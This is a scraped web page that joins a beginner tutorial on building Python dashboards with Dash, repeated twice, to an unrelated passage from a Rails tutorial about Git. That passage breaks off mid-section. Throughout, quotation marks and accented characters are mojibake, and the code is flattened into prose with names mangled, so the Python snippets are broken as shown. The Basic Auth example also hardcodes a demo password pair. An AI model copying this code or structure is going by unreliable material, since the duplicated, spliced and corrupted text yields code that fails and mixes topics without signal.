<p>import dash import dash_core_components as dcc import dash_html_components as html Just like in Flask we initialize Dash by calling the Dash class of dash. Once that is done we can create the layout for our application. We use the Div class from the dash_html_components to create an HTML Div. We then use the HTML components to generate HTML components such as H1, H2 etc. dash_html_components has all HTML tags. In order to create a graph on our layout, we use the Graph class from dash_core_components. Graph renders interactive data visualizations using plotly.js. The Graph class expects a figure object with the data to be plotted and the layout details. Dash also allows you to do stylings such as changing the background color and text color. You can change the background by using the style attribute and passing an object with your specific color. In our case, we have defined a color dictionary with the background and text color we would like. Similarly, we can change the layout background using the plot_bgcolor attribute.</p>
<p>In HTML the style property is specified using a semicolon, but in Dash, a dictionary is supplied. The keys in the dictionary are camelCased e.g text-align is textAlign. Instead of using classes like in HTML, className is used in Dash.</p>
<p>app = dash.Dash() colors = { âbackgroundâ: â#111111â, âtextâ: â#7FDBFFâ } app.layout = html.Div(style={âbackgroundColorâ: colors[âbackgroundâ]}, children=[ html.H1( children=âHello Dashâ, style={ âtextAlignâ: âcenterâ, âcolorâ: colors[âtextâ] } ), html.Div(children=âDash: A web application framework for Python.â, style={ âtextAlignâ: âcenterâ, âcolorâ: colors[âtextâ] }), dcc.Graph( id=âGraph1â, figure={ âdataâ: [ {âxâ: [1, 2, 3], âyâ: [4, 1, 2], âtypeâ: âbarâ, ânameâ: âSFâ}, {âxâ: [1, 2, 3], âyâ: [2, 4, 5], âtypeâ: âbarâ, ânameâ: uâMontrÃ©alâ}, ], âlayoutâ: { âplot_bgcolorâ: colors[âbackgroundâ], âpaper_bgcolorâ: colors[âbackgroundâ], âfontâ: { âcolorâ: colors[âtextâ] } } } )]) In order to view our visualization, we need to run our web server just like in Flask. Remember Dash is built on top of Flask. We also set debug to true to ensure we donât have to keep refreshing the server every time we make some changes</p>
<p>if <strong>name</strong> == â<strong>main</strong>â: app.run_server(debug=True) Next, move to the terminal and start the server by typing the code below: python app.py</p>
<p>This will start a new web server at <a href="http://127.0.0.1:8050/" class="uri">http://127.0.0.1:8050/</a>. Head over there and see your newly created dashboard.</p>
<p>Generating Scatter Plots</p>
<p>In order to plot a scatter plot, we import the normal dash components as previously done. We also need to import Plotly graph_objs in order to plot the scatter plot. As mentioned previously we use the Div class and Graph components from Dash in order to accomplish this. The Graph component takes a figure object which has the data and the layout description. We plot the scatter plot using graph_objs scatter property. In order to make sure the plot is a scatter plot we pass a mode attribute and set it as markers. Otherwise, we would have lines on the graph.</p>
<p>import dash import dash_core_components as dcc import dash_html_components as html import pandas as pd import plotly.graph_objs as go</p>
<p>app = dash.Dash()</p>
<p>df = pd.read_csv( â<a href="https://gist.githubusercontent.com/chriddyp/" class="uri">https://gist.githubusercontent.com/chriddyp/</a>â + â5d1ea79569ed194d432e56108a04d188/raw/â + âa9f9e8076b837d541398e999dcbac2b2826a81f8/â+ âgdp-life-exp-2007.csvâ)</p>
<p>app.layout = html.Div([ dcc.Graph( id=âlife-exp-vs-gdpâ, figure={ âdataâ: [ go.Scatter( x=df[df[âcontinentâ] == i][âgdp per capitaâ], y=df[df[âcontinentâ] == i][âlife expectancyâ], text=df[df[âcontinentâ] == i][âcountryâ], mode=âmarkersâ, opacity=0.8, marker={ âsizeâ: 15, âlineâ: {âwidthâ: 0.5, âcolorâ: âwhiteâ} }, name=i ) for i in df.continent.unique() ], âlayoutâ: go.Layout( xaxis={âtypeâ: âlogâ, âtitleâ: âGDP Per Capitaâ}, yaxis={âtitleâ: âLife Expectancyâ}, margin={âlâ: 40, âbâ: 40, âtâ: 10, ârâ: 10}, legend={âxâ: 0, âyâ: 1}, hovermode=âclosestâ ) } )])</p>
<p>if <strong>name</strong> == â<strong>main</strong>â: app.run_server()</p>
<p>Markdown</p>
<p>Sometimes you may need to include a lot of text in your dashboards. You can do this using dash_core_components Mardown attribute as shown below.</p>
<p>import dash import dash_core_components as dcc import dash_html_components as html</p>
<p>app = dash.Dash()</p>
<p>markdown_text = âââ ### Dash and Markdown A lot of text âââ</p>
<p>app.layout = html.Div([ dcc.Markdown(children=markdown_text)])</p>
<p>if <strong>name</strong> == â<strong>main</strong>â: app.run_server() Core Components</p>
<p>Next, letâs look at some dash_core_components that you will encounter when using Dash. You can generate a drop down as shown below. You do by calling Dropdown off dash_core_components and passing the options as a list of dictionaries. You can set the default value using the values attribute and passing in the default option.</p>
<p>dcc.Dropdown( options=[ {âlabelâ: âNew York Cityâ, âvalueâ: âNYCâ}, {âlabelâ: uâMontrÃ©alâ, âvalueâ: âMTLâ}, {âlabelâ: âSan Franciscoâ, âvalueâ: âSFâ} ], value=âMTLâ ) Generating a multi-select drop down is similar to above. The only changes are that you set the multi attribute to true since it is False by default. You can then specify the items you would like to be multi-selected by default by specifying the values attribute.</p>
<p>html.Label(âMulti-Select Dropdownâ), dcc.Dropdown( options=[ {âlabelâ: âNew York Cityâ, âvalueâ: âNYCâ}, {âlabelâ: uâMontrÃ©alâ, âvalueâ: âMTLâ}, {âlabelâ: âSan Franciscoâ, âvalueâ: âSFâ} ], value=[âMTLâ, âSFâ], multi=True ) Radio buttons can be generated using the RadioItems attribute. You then pass the options as a list of dictionaries. You can also set a default value by specifying the values attribute.</p>
<p>html.Label(âRadio Itemsâ), dcc.RadioItems( options=[ {âlabelâ: âNew York Cityâ, âvalueâ: âNYCâ}, {âlabelâ: uâMontrÃ©alâ, âvalueâ: âMTLâ}, {âlabelâ: âSan Franciscoâ, âvalueâ: âSFâ} ], value=âMTLâ ) To generate checkboxes, you call the Checklist attribute off dash_core_components. The options and default values are passed as above</p>
<p>html.Label(âCheckboxesâ), dcc.Checklist( options=[ {âlabelâ: âNew York Cityâ, âvalueâ: âNYCâ}, {âlabelâ: uâMontrÃ©alâ, âvalueâ: âMTLâ}, {âlabelâ: âSan Franciscoâ, âvalueâ: âSFâ} ], values=[âMTLâ, âSFâ] ) You will most certainly need input texts in your application. To generate them you will use the Input attribute. Using the Html Label tag, you can create a label for the Input filed. Using the values attribute you can specify some text in the field and to specify the type of use type and indicate whether its a text field, number, etc.</p>
<p>html.Label(âText Boxâ), dcc.Input(value=âMTLâ, type=âtextâ)</p>
<p>Calling help</p>
<p>Since Dash components are declarative, calling the help command on any of them will generate the help for that component.</p>
<p>help(dcc.Input)</p>
<p>Interactivity Now letâs cover how we can make our Dash apps interactive. In order to do this, we need to import Input and Output from dash.dependencies. Donât confuse these with the HTML Input because they are different. The HTML Input is imported from the dash core components. Below we create an input text and bind it a callback such that whenever you type something into that box, it updates my-div in real time. In order to enable this Dash provides a decorator <span class="citation">@app</span> which makes it possible to bind a callback function to my-div and the HTML input field. Notice that we use the decorator before we declare the update_output_div function.</p>
<p>import dash import dash_core_components as dcc import dash_html_components as html from dash.dependencies import Input, Output</p>
<p>app = dash.Dash()</p>
<p>app.layout = html.Div([ dcc.Input(id=âmy-idâ, value=âDash Appâ, type=âtextâ), html.Div(id=âmy-divâ)])</p>
<p><span class="citation">@app.callback</span>( Output(component_id=âmy-divâ, component_property=âchildrenâ), [Input(component_id=âmy-idâ, component_property=âvalueâ)] ) def update_output_div(input_value): return âYou've entered â{}ââ.format(input_value)</p>
<p>if <strong>name</strong> == â<strong>main</strong>â: app.run_server() Authentication Dash provides authentication through a separate package called dash-auth. It provides two modes of authentication HTTP Basic Auth and Plotly OAuth. In Basic Auth, you hardcode a set of usernames and passwords in your application. This method has some challenges such as users cannot log out of your application, users cannot create accounts or change passwords, and you are responsible for safely storing the usernames and passwords in your code. Plotly OAuth provides authentication through your online Plotly account, and itâs not free.</p>
<p>To set up the Basic Auth proceed as follows. First, install the necessary packages.</p>
<p>pip install dash==0.21.1 pip install dash-auth==1.0.0 After this set the username and password pairs you would like to have in your application.</p>
<p>VALID_USERNAME_PASSWORD_PAIRS = [ [âhelloâ, âworldâ]] The dash_auth.BasicAuth utility from Dash will take care of authentication for you once the password pairs have been set. All you have to do is pass the password pairs and your application name to dash_auth.BasicAuth.</p>
<p>app = dash.Dash(âauthâ) auth = dash_auth.BasicAuth( app, VALID_USERNAME_PASSWORD_PAIRS )</p>
<p>Hosting Dashboards on Heroku Hosting your dashboard on Heroku is fairly easy but will take a couple of steps.</p>
<p>First, create a directory that will hold all your projects files. You can do this on Ubuntu using the mkdir command.</p>
<p>$ mkdir my_dash_app $ cd my_dash_app Next, initialize the folder with git and virtualenv. Git is for version control, and virtualenv will enable us to create a virtual environment to hold all our Python dependencies. After creating the environment, we activate it using the source command.</p>
<p>$ git init $ virtualenv venv $ source venv/bin/activate Next, we install all the packages we need for our Dash application:</p>
<p>$ pip install dash $ pip install dash-renderer $ pip install dash-core-components $ pip install dash-html-components $ pip install plotly In order to serve our Dash application, we need a Python web server. We never use Flaskâs development server in production. We use Gunicorn web server for this function. Install it as shown below:</p>
<p>$ pip install gunicorn</p>
<p>Next, we need to create a few files in our folder:</p>
<p>app.py where we will code our dash application. A .gitignore to make sure that unnecessary files are not pushed to production A requirements.txt file that will contain all the Python dependencies and their versions. A Procfile for deployment. Add the following to app.py. This is just an example so you can use your own Dash dashboard.</p>
<p>import os import dash import dash_core_components as dcc import dash_html_components as html app = dash.Dash(<strong>name</strong>) server = app.server app.layout = html.Div([ html.H2(âHello Worldâ), dcc.Dropdown( id=âdropdownâ, options=[{âlabelâ: i, âvalueâ: i} for i in [âLAâ, âNYCâ, âMTLâ]], value=âLAâ ), html.Div(id=âdisplay-valueâ)]) <span class="citation">@app.callback</span>(dash.dependencies.Output(âdisplay-valueâ, âchildrenâ), [dash.dependencies.Input(âdropdownâ, âvalueâ)]) def display_value(value): return âYou have selected â{}ââ.format(value) if <strong>name</strong> == â<strong>main</strong>â: app.run_server(debug=True) It is important to remind ourselves that at its core a Dash application is also a Flask application. For purposes of deployment, we need to access the Flask application instance. Dash enables us to do this using app.server</p>
<p>app = dash.Dash(<strong>name</strong>) server = app.server Add the files you would not like to be pushed to production in the .gitignore file. A good Python .gitignore file is available at Github</p>
<p>Now letâs specify our deployment information in the Procfile. We use the web variable to specify our server as gunicorn. We also specify our app details utilizing the app variable. app refers to the filename app.py and server refers to the server variable inside that file.</p>
<p>web: gunicorn app:server</p>
<p>We also need to write our Python dependencies to the requirements file. Heroku will install them during deployment.</p>
<p>pip freeze &gt; requirements.txt</p>
<p>The next steps assume that you have an Heroku account and have installed the Heroku CLI. In case you do not have those in place head over to <a href="https://www.heroku.com" class="uri">https://www.heroku.com</a> and set them up.</p>
<p>The next step is to create a Heroku app on the terminal and add all our application packages. Once you have committed the changes; push your application to heroku master. The output of this command will have a link to your live Dash application on Heroku.</p>
<p>$ heroku create your-app-name $ git add . $ git commit -m âYour-commit-messageâ $ git push heroku master This serves as an introduction to building a dashboard in pure Python using Dash by Plotly. To learn more about Dash visit the official docs.</p>

<p>Dash for Beginners Learn how to build dashboards in Python using Dash. Dash is Python framework for building web applications. It built on top of Flask, Plotly.js, React and React Js. It enables you to build dashboards using pure Python. Dash is open source, and its apps run on the web browser. In this tutorial, we introduce the reader to Dash fundamentals and assume that they have prior experience with Plotly.</p>
<p>Dash Installation</p>
<p>In order to start using Dash, we have to install several packages.</p>
<p>The core dash backend. Dash front-end Dash HTML components Dash core components Plotly pip install dash==0.21.1<br />
pip install dash-renderer==0.13.0<br />
pip install dash-html-components==0.11.0 pip install dash-core-components==0.23.0<br />
pip install plotly âupgrade Dash App Layout</p>
<p>A Dash application is usually composed of two parts. The first part is the layout and describes how the app will look like and the second part describes the interactivity of the application. Dash provides HTML classes that enable us to generate HTML content with Python. To use these classes, we need to import dash_core_components and dash_html_components. You can also create your own custom components using Javascript and React Js.</p>
<p>To kick us off we shall create a file called app.py using our favorite text editor then import these packages.</p>
<p>import dash import dash_core_components as dcc import dash_html_components as html Just like in Flask we initialize Dash by calling the Dash class of dash. Once that is done we can create the layout for our application. We use the Div class from the dash_html_components to create an HTML Div. We then use the HTML components to generate HTML components such as H1, H2 etc. dash_html_components has all HTML tags. In order to create a graph on our layout, we use the Graph class from dash_core_components. Graph renders interactive data visualizations using plotly.js. The Graph class expects a figure object with the data to be plotted and the layout details. Dash also allows you to do stylings such as changing the background color and text color. You can change the background by using the style attribute and passing an object with your specific color. In our case, we have defined a color dictionary with the background and text color we would like. Similarly, we can change the layout background using the plot_bgcolor attribute.</p>
<p>In HTML the style property is specified using a semicolon, but in Dash, a dictionary is supplied. The keys in the dictionary are camelCased e.g text-align is textAlign. Instead of using classes like in HTML, className is used in Dash.</p>
<p>app = dash.Dash() colors = { âbackgroundâ: â#111111â, âtextâ: â#7FDBFFâ } app.layout = html.Div(style={âbackgroundColorâ: colors[âbackgroundâ]}, children=[ html.H1( children=âHello Dashâ, style={ âtextAlignâ: âcenterâ, âcolorâ: colors[âtextâ] } ), html.Div(children=âDash: A web application framework for Python.â, style={ âtextAlignâ: âcenterâ, âcolorâ: colors[âtextâ] }), dcc.Graph( id=âGraph1â, figure={ âdataâ: [ {âxâ: [1, 2, 3], âyâ: [4, 1, 2], âtypeâ: âbarâ, ânameâ: âSFâ}, {âxâ: [1, 2, 3], âyâ: [2, 4, 5], âtypeâ: âbarâ, ânameâ: uâMontrÃ©alâ}, ], âlayoutâ: { âplot_bgcolorâ: colors[âbackgroundâ], âpaper_bgcolorâ: colors[âbackgroundâ], âfontâ: { âcolorâ: colors[âtextâ] } } } )]) In order to view our visualization, we need to run our web server just like in Flask. Remember Dash is built on top of Flask. We also set debug to true to ensure we donât have to keep refreshing the server every time we make some changes</p>
<p>if <strong>name</strong> == â<strong>main</strong>â: app.run_server(debug=True) Next, move to the terminal and start the server by typing the code below: python app.py</p>
<p>This will start a new web server at <a href="http://127.0.0.1:8050/" class="uri">http://127.0.0.1:8050/</a>. Head over there and see your newly created dashboard.</p>
<p>Generating Scatter Plots</p>
<p>In order to plot a scatter plot, we import the normal dash components as previously done. We also need to import Plotly graph_objs in order to plot the scatter plot. As mentioned previously we use the Div class and Graph components from Dash in order to accomplish this. The Graph component takes a figure object which has the data and the layout description. We plot the scatter plot using graph_objs scatter property. In order to make sure the plot is a scatter plot we pass a mode attribute and set it as markers. Otherwise, we would have lines on the graph.</p>
<p>import dash import dash_core_components as dcc import dash_html_components as html import pandas as pd import plotly.graph_objs as go</p>
<p>app = dash.Dash()</p>
<p>df = pd.read_csv( â<a href="https://gist.githubusercontent.com/chriddyp/" class="uri">https://gist.githubusercontent.com/chriddyp/</a>â + â5d1ea79569ed194d432e56108a04d188/raw/â + âa9f9e8076b837d541398e999dcbac2b2826a81f8/â+ âgdp-life-exp-2007.csvâ)</p>
<p>app.layout = html.Div([ dcc.Graph( id=âlife-exp-vs-gdpâ, figure={ âdataâ: [ go.Scatter( x=df[df[âcontinentâ] == i][âgdp per capitaâ], y=df[df[âcontinentâ] == i][âlife expectancyâ], text=df[df[âcontinentâ] == i][âcountryâ], mode=âmarkersâ, opacity=0.8, marker={ âsizeâ: 15, âlineâ: {âwidthâ: 0.5, âcolorâ: âwhiteâ} }, name=i ) for i in df.continent.unique() ], âlayoutâ: go.Layout( xaxis={âtypeâ: âlogâ, âtitleâ: âGDP Per Capitaâ}, yaxis={âtitleâ: âLife Expectancyâ}, margin={âlâ: 40, âbâ: 40, âtâ: 10, ârâ: 10}, legend={âxâ: 0, âyâ: 1}, hovermode=âclosestâ ) } )])</p>
<p>if <strong>name</strong> == â<strong>main</strong>â: app.run_server()</p>
<p>Markdown</p>
<p>Sometimes you may need to include a lot of text in your dashboards. You can do this using dash_core_components Mardown attribute as shown below.</p>
<p>import dash import dash_core_components as dcc import dash_html_components as html</p>
<p>app = dash.Dash()</p>
<p>markdown_text = âââ ### Dash and Markdown A lot of text âââ</p>
<p>app.layout = html.Div([ dcc.Markdown(children=markdown_text)])</p>
<p>if <strong>name</strong> == â<strong>main</strong>â: app.run_server() Core Components</p>
<p>Next, letâs look at some dash_core_components that you will encounter when using Dash. You can generate a drop down as shown below. You do by calling Dropdown off dash_core_components and passing the options as a list of dictionaries. You can set the default value using the values attribute and passing in the default option.</p>
<p>dcc.Dropdown( options=[ {âlabelâ: âNew York Cityâ, âvalueâ: âNYCâ}, {âlabelâ: uâMontrÃ©alâ, âvalueâ: âMTLâ}, {âlabelâ: âSan Franciscoâ, âvalueâ: âSFâ} ], value=âMTLâ ) Generating a multi-select drop down is similar to above. The only changes are that you set the multi attribute to true since it is False by default. You can then specify the items you would like to be multi-selected by default by specifying the values attribute.</p>
<p>html.Label(âMulti-Select Dropdownâ), dcc.Dropdown( options=[ {âlabelâ: âNew York Cityâ, âvalueâ: âNYCâ}, {âlabelâ: uâMontrÃ©alâ, âvalueâ: âMTLâ}, {âlabelâ: âSan Franciscoâ, âvalueâ: âSFâ} ], value=[âMTLâ, âSFâ], multi=True ) Radio buttons can be generated using the RadioItems attribute. You then pass the options as a list of dictionaries. You can also set a default value by specifying the values attribute.</p>
<p>html.Label(âRadio Itemsâ), dcc.RadioItems( options=[ {âlabelâ: âNew York Cityâ, âvalueâ: âNYCâ}, {âlabelâ: uâMontrÃ©alâ, âvalueâ: âMTLâ}, {âlabelâ: âSan Franciscoâ, âvalueâ: âSFâ} ], value=âMTLâ ) To generate checkboxes, you call the Checklist attribute off dash_core_components. The options and default values are passed as above</p>
<p>html.Label(âCheckboxesâ), dcc.Checklist( options=[ {âlabelâ: âNew York Cityâ, âvalueâ: âNYCâ}, {âlabelâ: uâMontrÃ©alâ, âvalueâ: âMTLâ}, {âlabelâ: âSan Franciscoâ, âvalueâ: âSFâ} ], values=[âMTLâ, âSFâ] ) You will most certainly need input texts in your application. To generate them you will use the Input attribute. Using the Html Label tag, you can create a label for the Input filed. Using the values attribute you can specify some text in the field and to specify the type of use type and indicate whether its a text field, number, etc.</p>
<p>html.Label(âText Boxâ), dcc.Input(value=âMTLâ, type=âtextâ)</p>
<p>Calling help</p>
<p>Since Dash components are declarative, calling the help command on any of them will generate the help for that component.</p>
<p>help(dcc.Input)</p>
<p>Interactivity Now letâs cover how we can make our Dash apps interactive. In order to do this, we need to import Input and Output from dash.dependencies. Donât confuse these with the HTML Input because they are different. The HTML Input is imported from the dash core components. Below we create an input text and bind it a callback such that whenever you type something into that box, it updates my-div in real time. In order to enable this Dash provides a decorator <span class="citation">@app</span> which makes it possible to bind a callback function to my-div and the HTML input field. Notice that we use the decorator before we declare the update_output_div function.</p>
<p>import dash import dash_core_components as dcc import dash_html_components as html from dash.dependencies import Input, Output</p>
<p>app = dash.Dash()</p>
<p>app.layout = html.Div([ dcc.Input(id=âmy-idâ, value=âDash Appâ, type=âtextâ), html.Div(id=âmy-divâ)])</p>
<p><span class="citation">@app.callback</span>( Output(component_id=âmy-divâ, component_property=âchildrenâ), [Input(component_id=âmy-idâ, component_property=âvalueâ)] ) def update_output_div(input_value): return âYou've entered â{}ââ.format(input_value)</p>
<p>if <strong>name</strong> == â<strong>main</strong>â: app.run_server() Authentication Dash provides authentication through a separate package called dash-auth. It provides two modes of authentication HTTP Basic Auth and Plotly OAuth. In Basic Auth, you hardcode a set of usernames and passwords in your application. This method has some challenges such as users cannot log out of your application, users cannot create accounts or change passwords, and you are responsible for safely storing the usernames and passwords in your code. Plotly OAuth provides authentication through your online Plotly account, and itâs not free.</p>
<p>To set up the Basic Auth proceed as follows. First, install the necessary packages.</p>
<p>pip install dash==0.21.1 pip install dash-auth==1.0.0 After this set the username and password pairs you would like to have in your application.</p>
<p>VALID_USERNAME_PASSWORD_PAIRS = [ [âhelloâ, âworldâ]] The dash_auth.BasicAuth utility from Dash will take care of authentication for you once the password pairs have been set. All you have to do is pass the password pairs and your application name to dash_auth.BasicAuth.</p>
<p>app = dash.Dash(âauthâ) auth = dash_auth.BasicAuth( app, VALID_USERNAME_PASSWORD_PAIRS )</p>
<p>Hosting Dashboards on Heroku Hosting your dashboard on Heroku is fairly easy but will take a couple of steps.</p>
<p>First, create a directory that will hold all your projects files. You can do this on Ubuntu using the mkdir command.</p>
<p>$ mkdir my_dash_app $ cd my_dash_app Next, initialize the folder with git and virtualenv. Git is for version control, and virtualenv will enable us to create a virtual environment to hold all our Python dependencies. After creating the environment, we activate it using the source command.</p>
<p>$ git init $ virtualenv venv $ source venv/bin/activate Next, we install all the packages we need for our Dash application:</p>
<p>$ pip install dash $ pip install dash-renderer $ pip install dash-core-components $ pip install dash-html-components $ pip install plotly In order to serve our Dash application, we need a Python web server. We never use Flaskâs development server in production. We use Gunicorn web server for this function. Install it as shown below:</p>
<p>$ pip install gunicorn</p>
<p>Next, we need to create a few files in our folder:</p>
<p>app.py where we will code our dash application. A .gitignore to make sure that unnecessary files are not pushed to production A requirements.txt file that will contain all the Python dependencies and their versions. A Procfile for deployment. Add the following to app.py. This is just an example so you can use your own Dash dashboard.</p>
<p>import os import dash import dash_core_components as dcc import dash_html_components as html app = dash.Dash(<strong>name</strong>) server = app.server app.layout = html.Div([ html.H2(âHello Worldâ), dcc.Dropdown( id=âdropdownâ, options=[{âlabelâ: i, âvalueâ: i} for i in [âLAâ, âNYCâ, âMTLâ]], value=âLAâ ), html.Div(id=âdisplay-valueâ)]) <span class="citation">@app.callback</span>(dash.dependencies.Output(âdisplay-valueâ, âchildrenâ), [dash.dependencies.Input(âdropdownâ, âvalueâ)]) def display_value(value): return âYou have selected â{}ââ.format(value) if <strong>name</strong> == â<strong>main</strong>â: app.run_server(debug=True) It is important to remind ourselves that at its core a Dash application is also a Flask application. For purposes of deployment, we need to access the Flask application instance. Dash enables us to do this using app.server</p>
<p>app = dash.Dash(<strong>name</strong>) server = app.server Add the files you would not like to be pushed to production in the .gitignore file. A good Python .gitignore file is available at Github</p>
<p>Now letâs specify our deployment information in the Procfile. We use the web variable to specify our server as gunicorn. We also specify our app details utilizing the app variable. app refers to the filename app.py and server refers to the server variable inside that file.</p>
<p>web: gunicorn app:server</p>
<p>We also need to write our Python dependencies to the requirements file. Heroku will install them during deployment.</p>
<p>pip freeze &gt; requirements.txt</p>
<p>The next steps assume that you have an Heroku account and have installed the Heroku CLI. In case you do not have those in place head over to <a href="https://www.heroku.com" class="uri">https://www.heroku.com</a> and set them up.</p>
<p>The next step is to create a Heroku app on the terminal and add all our application packages. Once you have committed the changes; push your application to heroku master. The output of this command will have a link to your live Dash application on Heroku.</p>
<p>$ heroku create your-app-name $ git add . $ git commit -m âYour-commit-messageâ $ git push heroku master This serves as an introduction to building a dashboard in pure Python using Dash by Plotly. To learn more about Dash visit the official docs.</p>

<p>We can also look at Rails from the perspective of a time traveler in order to understand the importance of software version control. Specifically, we use the Git revision control system to record a series of snapshots of your projectâs filesystem. Git makes it easy to back up and recover files; more importantly, Git lets you make exploratory changes, trying out code you may decide to discard, without disturbing work youâve done earlier. You can use Git with GitHub, a popular âsocial codingâ website, for remote backup of your projects and community collaboration. Git can keep multiple versions (âbranchesâ) of your local code in sync with a remote GitHub repository, making it possible to collaborate with others on open source or proprietary projects. Strictly speaking, Git and GitHub are not part of Rails (they are tools that can be used on any development project). And there are several other version control systems that are used in open source development. But a professional Rails developer uses Git and GitHub constantly on any real-world Rails project. Rails and the gems that go into a complex web application would not exist without Git and GitHub.</p>
<p>Finally, we can consider a Rails application from the perspective of a tester. Software testing is part of Rails culture; Rails is the first web development platform to make testing an integrated part of development. Before Rails, automated testing was rarely part of web development. A web application would be tested by users and (maybe) a QA team. If automated tests were used, the tests were often written after the web application was largel complete. Rails introduced the discipline of Test-Driven Development (TDD) to the wider web development community. With TDD, tests are written before any implementation coding. It may seem odd to write tests first, but for a skilled TDD practitioner, it brings coherence to the programming process. First, the developer will give thought to what needs to be accomplished and think through alternatives and edge cases. Second, the developer will have complete test coverage for the project. With good test coverage, it is easier to refactor, rearranging code to be more elegant or efficient. Running a test suite after refactoring provides assurance that nothing inadvertently broke after the changes.</p>
<p>TDD</p>
<p>TDD is seen as a necessary skill of an experienced Rails developer. Because this is a tutorial for beginners, it will not introduce you to techniques of Test-Driven Development. As you work through more advanced tutorials, youâll be introduced to Test-Driven Development.</p>
<p>Time Travel with Git</p>
<p>Now that weâve looked at our Rails project directory from the viewpoint of a programmer and software architect, letâs consider the viewpoint of the time traveler. This chapter will introduce you to software source control, also called version control or revision control. The terms all have the same meaning; at first sight, the concept seems rather dull, like sorting your socks. But it makes professional software development possible and, at the core, it is essentially a form of time travel.</p>
<p>To understand time travel, we need to understand state. Itâs a term youâll encounter often in software development. We know about states of matter. Water can be ice, liquid, or steam. Imagine a machine with a button that, each time it is pressed, changes water from one state to another. We call this a state machine. Almost every software program is a state machine. When a program receives an input, it transitions from one state to another. Like flipping a light switch, thereâs no in-between. Light or dark. Ice, liquid, or steam. Or, in a web application: logged in, logged out. When we write software code, thereâs a lot of in-between. We look things up, we think, we type errors and we make corrections. As humans, we spend a lot of time in a flow of undetermined state. We can save our work at any time, but we may be saving typos or unfinished code that doesnât work. Every so often, we get to a point where a task is finished; weâve fixed all our errors and our code runs. We want to preserve the state of our work.</p>
<p>Thatâs when we need a version control system. A version control system does more than a software applicationâs âSaveâ command. Like a âSaveâ command, it preserves the current state of our files. It also allows us to add a short note that describes the work weâve done. More importantly, it archives a snapshot of the current state in a repository where it can be retrieved if needed. Hereâs where the time travel comes in. We can go back and recover the state of our work at any point where we committed a snapshot to the repository. In software development, travel to the past is essential because we often make mistakes or false starts and have to return to a point where we know things were working correctly. What about time travel to the future? Often we need to try out code we may decide to discard, without disturbing work weâve done earlier. Version control systems allow us to explore alternative futures by creating a branch for our work. If we like what weâve done in our branch, we can merge it into the main trunk of our software project. Unlike time travel in the movies, we canât travel back to any arbitrary point in the flow of time. We can only travel to past or future states weâve marked as significant by checking our work into the repository.</p>
<p>Git</p>
<p>The dominant version control system among Rails developers is Git, created by the developer of the Linux operating system. Unlike earlier version control systems, Git is ideal for wide-scale distributed open source software development. Combined with GitHub, the âsocial codingâ website, Git makes it easy to share and merge code. When you work with others on a project, your Git commit messages (the notes that accompany your snapshot) offer a narrative about the progress of the project. Well-written commit messages describe your work to co-workers or open source collaborators.</p>
<p>GitHubâs support for forking (making your own copy of a repository) makes it possible to take someone elseâs project and modify it without impacting the original. That means you can customize an open source project for your own needs. You can also fix bugs or add a feature to an open source project and submit a pull request for the project maintainer to add your work to the original. Fixing bugs (large or small) and adding features to open source projects are how you build your reputation in the Rails community. Your GitHub account, which shows all your commits, both to public projects and your own projects, is more important than your resumÃ© when a potential employer considers hiring you because it shows the real work you have done. Collaboration is easy when you use a branch in Git. If you and a coworker are working on the same codebase, you can each make a branch before adding to the code or making changes. Git supports several kinds of merges, so you can integrate your branch with the trunk when your task is complete. If your changes collide with your coworkerâs changes, Git identifies the conflict so you can resolve the collision before completing the merge.</p>
<p>All the power of Git comes at a price. Git is difficult for a beginner to learn, largely because many of its procedures have no real-world analog. Have you noticed how time travel movies require mental gymnastics, especially when you try to make sense of alternative futures and intersecting timelines? Git is a lot like that, mostly because we use it to do things we donât ordinarily do in the real world. In this tutorial, you wonât encounter Gitâs advanced procedures, like resolving merges or reverting to earlier versions. Weâll stick to the basics of archiving our work (and in one case, discarding work that weâve done for practice). You can build the tutorial project without using Git. But I urge you to use Git and a GitHub account for this project, for two reasons. First, with your tutorial application on GitHub, youâll show potential employers or collaborators that youâve successfully built a useful, functioning Rails application. More importantly, you must get to know Git if you plan to do any serious coding, either as a professional or a hobbyist.</p>
<p>Before I show you Git commands, I want to mention that some people use graphical client applications to manage Git. Mac OS X has GitHub for Mac, Git Tower, and other Mac Git clients. Graphical applications for Git are useful for colleagues who donât use a Terminal application, such as graphic designers or writers. Thereâs no need for you to install these applications. Every developer Iâve met uses Git from the command line. It will take effort to master Git; the commands are not intuitive. But it is absolutely necessary to become familiar with Git basics. Before you do any work on the tutorial application, Iâll show you the basics of setting up and using Git.</p>
<p>Is Git Installed?</p>
<p>As a first step, make sure Git is installed on your computer:</p>
<pre class="r"><code>$ which git
/usr/local/bin/git
$ git version
git version ...</code></pre>
<p>If Git is not found, install Git. See the article Rails with Git and GitHub for installation instructions.</p>
<p>Is Git Configured?</p>
<p>Make sure Git knows who you are. Every time you update your Git repository with the git commit command, Git will identify you as the author of the changes.</p>
<pre class="r"><code>$ git config --get user.name
$ git config --get user.email</code></pre>
<p>You should see your name and email address. If not, configure Git:</p>
<pre class="r"><code>$ git config --global user.name &quot;Real Name&quot;&quot;
$ git config --global user.email &quot;me@example.com&quot;</code></pre>
<p>Use your real name so people will associate you with your work when they meet you in real life. Thereâs no reason to use a clever name unless you have something to hide. Use the same email address for Git, your GitHub account, and Heroku to avoid headaches.</p>
<p>Create a Repository: Now weâll add a Git repository to our project. Itâs a basic step youâll repeat every time you create a new Rails project.</p>
<p>Extending the time traveler analogy, initializing a Git repository is equivalent to setting up the time machine. The git init command sets up a Git repository (a ârepoâ) in the project directory. We add the Unix symbol that indicates Git should be initialized in the current directory (git init dot):</p>
<pre class="r"><code>$ git init .
Initialized empty Git repository in ...</code></pre>
<p>It creates a hidden folder named .git/ in the project directory. You can peek at the contents:</p>
<pre class="r"><code>$ ls -1p .git
HEAD
config
description
hooks/
info/
objects/
refs/</code></pre>
<p>All Git commands operate on the hidden files. The hidden files record the changing state o your project files each time you run the git commit command. There is no reason to ever edit files inside the hidden .git/ folder (doing so could break your time machine).</p>
<p>GitIgnore</p>
<p>The hidden .git/ folder contains the Git repository with all the snapshots of your changing project. The snapshots are highly compressed, only containing records of changes, so the repository takes up very little file space relative to the project as a whole. Not every file should be included in a Git snapshot. Here are some types of files that should be ignored:</p>
<p>â¢ log files created by the web server â¢ database files â¢ configuration files that include passwords or API keys</p>
<p>Git gives us an easy way to ignore files. A hidden file in the project directory named .gitignore can specify a list of files that are never seen by Git. The rails new command creates a .gitignore file with defaults that include log files and database files. Later, when we add configuration files that include secrets, weâll update the .gitignore file. Take a look at the contents of the .gitignore file. We use the Unix cat command to display the contents of the file:</p>
<pre class="r"><code>$ cat .gitignore
